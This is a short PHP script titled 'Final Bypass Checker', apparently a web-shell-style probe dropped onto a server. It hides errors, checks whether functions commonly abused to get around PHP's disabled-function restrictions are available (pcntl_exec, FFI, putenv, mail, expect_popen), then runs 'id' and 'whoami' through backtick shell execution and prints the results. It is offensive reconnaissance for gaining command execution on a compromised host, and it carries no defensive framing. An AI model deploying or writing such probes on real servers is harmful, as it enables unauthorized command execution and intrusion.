<?php
error_reporting(0);
echo "<h2>Final Bypass Checker</h2><pre>";

$funcs = ['putenv', 'mail', 'pcntl_fork', 'pcntl_exec', 'FFI', 'dl', 'expect_popen', 'error_log', 'mb_send_mail'];
foreach($funcs as $f) {
    echo "$f → " . (function_exists($f) || class_exists($f) ? "✅ ENABLED" : "❌ Disabled") . "\n";
}

echo "\nTry Backtick (last hope): \n" . @`id 2>&1`;
echo "\n\nCurrent User: " . getenv('USER') . " / " . @`whoami 2>&1`;
?>
